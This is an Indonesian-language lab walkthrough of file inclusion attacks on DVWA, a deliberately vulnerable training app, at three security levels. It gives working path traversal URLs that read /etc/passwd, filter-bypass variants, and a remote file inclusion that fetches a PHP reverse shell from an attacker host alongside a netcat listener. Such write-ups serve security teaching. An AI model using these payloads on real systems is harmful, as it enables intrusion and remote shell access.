# File Inclusion
File Inclusion Attack adalah jenis celah keamanan web yang memungkinkan penyerang mengakses file sensitif di server atau memungkinkan mereka untuk menjalankan file berbahaya di server mereka.

## Security Low
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=file4.php
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/file%20inclusion/file%20inclusion%201.JPG)

```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=../../hackable/flags/fi.php
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/file%20inclusion/file%20inclusion%202.JPG)

Membuka isi file **/etc/passwd** di server
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/file%20inclusion/file%20inclusion%203.JPG)

Menjalankan file **php-reverse-shell.php** ke server
```sh
python3 -m http.server 80
```
```sh
nc -lnvp <port>
```
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=http://<IP_Attacker>/php-reverse-shell.php
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/file%20inclusion/file%20inclusion%204.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/file%20inclusion/file%20inclusion%205.JPG)

## Security Medium
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=....//....//hackable/flags/fi.php
```

Membuka isi file **/etc/passwd** di server
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=....//....//....//....//....//....//etc/passwd
```

Menjalankan file **php-reverse-shell.php** ke server
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=hthttp://tp://<IP_Attacker>/php-reverse-shell.php
```

## Security High
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=file:///var/www/html/DVWA/hackable/flags/fi.php
```

Membuka isi file **/etc/passwd** di server
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=file:///etc/passwd
```
